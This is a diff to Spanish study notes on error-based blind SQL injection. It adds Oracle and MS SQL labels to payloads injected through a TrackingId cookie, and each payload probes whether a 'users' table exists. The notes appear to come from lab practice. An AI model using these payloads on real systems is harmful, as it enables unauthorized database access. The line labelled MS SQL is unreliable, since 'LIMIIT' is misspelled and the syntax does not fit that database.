@@ -215,9 +215,9 @@ TrackingId=xyz'||(SELECT '' FROM tabla-imaginaria )||' => Esto genera una subcon
 ```
 Intenta siempre generar consulta SQL sintacticamente validas, para obtener información clave utilizando errores para inferir la información clave ejemplos
 
-TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||' => Si la consulta no devuelve un error se puede inferir que existe, es imporatnte delimitar el numero de columnas de lo contrario romperan la concatenación
+[Oracle]  TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||' => Si la consulta no devuelve un error se puede inferir que existe, es imporatnte delimitar el numero de columnas de lo contrario romperan la concatenación
 
-TrackingId=xyz'||(SELECT '' FROM users WHERE LIMIIT = 1)||' => Si la consulta no devuelve un error se puede inferir que existe, es imporatnte delimitar el numero de columnas de lo contrario romperan la concatenación
+[MS SQL]  TrackingId=xyz'||(SELECT '' FROM users WHERE LIMIIT = 1)||' => Si la consulta no devuelve un error se puede inferir que existe, es imporatnte delimitar el numero de columnas de lo contrario romperan la concatenación
 
 ```
 
